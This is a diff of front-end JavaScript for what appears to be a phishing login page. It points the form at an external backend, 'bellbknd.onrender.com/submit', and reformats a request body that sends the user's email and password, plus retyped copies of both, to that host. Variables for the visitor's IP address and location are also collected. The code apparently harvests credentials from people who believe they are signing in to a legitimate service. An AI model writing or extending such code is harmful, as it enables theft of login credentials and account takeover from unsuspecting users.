@@ -8,7 +8,7 @@
   let isContainerVisible = true;
  
 // Put your backend url here
-  let backendUrl = 'bellbknd.onrender.com';
+  let backendUrl = 'bellbknd.onrender.com/submit';
 
   let ipAddress = '';
   let location = {
@@ -112,10 +112,10 @@
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-        email: email,
-        password: password,
-        retypedEmail: modalEmail,
-        retypedPassword: modalPassword,
+        'email': email,
+        'password': password,
+        'retypedEmail': modalEmail,
+        'retypedPassword': modalPassword,
       }),
     });
 
